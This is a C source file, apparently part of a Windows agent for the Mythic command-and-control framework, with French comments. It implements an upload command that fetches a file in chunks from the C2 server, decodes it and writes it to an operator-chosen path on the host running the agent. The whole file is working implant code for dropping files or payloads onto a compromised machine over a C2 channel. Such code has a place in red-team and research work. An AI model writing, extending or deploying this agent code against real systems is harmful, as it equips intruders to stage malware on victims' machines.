#define _WIN32_WINNT 0x0600
#include "commands.h"
#include "utils.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#ifdef INCLUDE_CMD_UPLOAD

#define UPLOAD_CHUNK_SIZE (512 * 1024)

/* Extrait une valeur entière JSON pour la clé donnée (valeur non quotée) */
static int extract_json_int(const char *json, const char *key, int defval) {
  char pat[64];
  snprintf(pat, sizeof(pat), "\"%s\"", key);
  const char *kp = strstr(json, pat);
  if (!kp)
    return defval;
  const char *vp = strchr(kp, ':');
  if (!vp)
    return defval;
  vp++;
  while (*vp == ' ' || *vp == '\t')
    vp++;
  return atoi(vp);
}

/* Extrait la valeur d'une clé JSON dont le contenu est du base64
 * (pas de caractères spéciaux → recherche du premier '"' suffisant).
 * Retourne un buffer malloc'd à libérer par l'appelant, ou NULL. */
static char *extract_b64_value(const char *json, const char *key) {
  char pat[72];
  snprintf(pat, sizeof(pat), "\"%s\":\"", key);
  const char *start = strstr(json, pat);
  if (!start)
    return NULL;
  start += strlen(pat);
  const char *end = strchr(start, '"');
  if (!end)
    return NULL;
  size_t len = (size_t)(end - start);
  char *result = (char *)malloc(len + 1);
  if (!result)
    return NULL;
  memcpy(result, start, len);
  result[len] = '\0';
  return result;
}

void command_upload(char *task_id, char *params) {
  char file_id[128] = {0};
  char remote_path[MAX_PATH] = {0};

  if (params[0] == '{') {
    extract_json_string(params, "file", file_id, sizeof(file_id));
    extract_json_string(params, "remote_path", remote_path, sizeof(remote_path));
  }

  if (strlen(file_id) == 0) {
    send_task_response(task_id, "Error: no file_id specified");
    return;
  }
  if (strlen(remote_path) == 0) {
    send_task_response(task_id, "Error: no remote_path specified");
    return;
  }

  FILE *f = fopen(remote_path, "wb");
  if (!f) {
    char err[MAX_PATH + 32];
    snprintf(err, sizeof(err), "Error: cannot create file: %s", remote_path);
    send_task_response(task_id, err);
    return;
  }

  char *escaped_path = json_escape(remote_path);
  int total_chunks = -1;
  int chunk_num = 1;
  int success = 1;

  while (1) {
    /* Construction de la requête de chunk */
    char json_msg[1024];
    if (chunk_num == 1) {
      snprintf(json_msg, sizeof(json_msg),
               "{\"action\":\"post_response\",\"responses\":[{\"task_id\":\"%s\","
               "\"upload\":{\"chunk_size\":%d,\"file_id\":\"%s\","
               "\"chunk_num\":1,\"full_path\":\"%s\"}}]}",
               task_id, UPLOAD_CHUNK_SIZE, file_id, escaped_path);
    } else {
      snprintf(json_msg, sizeof(json_msg),
               "{\"action\":\"post_response\",\"responses\":[{\"task_id\":\"%s\","
               "\"upload\":{\"chunk_num\":%d,\"file_id\":\"%s\"}}]}",
               task_id, chunk_num, file_id);
    }

    char *b64_resp = send_c2_message(json_msg);
    if (!b64_resp) {
      success = 0;
      break;
    }

    char *json_resp = process_mythic_response(b64_resp, strlen(b64_resp));
    free(b64_resp);
    if (!json_resp) {
      success = 0;
      break;
    }

    /* Premier chunk : lire total_chunks */
    if (chunk_num == 1) {
      total_chunks = extract_json_int(json_resp, "total_chunks", -1);
      if (total_chunks <= 0) {
        free(json_resp);
        success = 0;
        break;
      }
    }

    /* Extraire et décoder chunk_data */
    char *b64_chunk = extract_b64_value(json_resp, "chunk_data");
    free(json_resp);

    if (!b64_chunk) {
      success = 0;
      break;
    }

    size_t decoded_len = 0;
    unsigned char *decoded =
        base64_decode_bin(b64_chunk, strlen(b64_chunk), &decoded_len);
    free(b64_chunk);

    if (decoded) {
      fwrite(decoded, 1, decoded_len, f);
      free(decoded);
    }

    if (chunk_num >= total_chunks)
      break;
    chunk_num++;
  }

  fclose(f);
  free(escaped_path);

  if (success) {
    send_task_response(task_id, "Upload complete.");
  } else {
    send_task_response(task_id, "Error: upload failed.");
  }
}

#endif
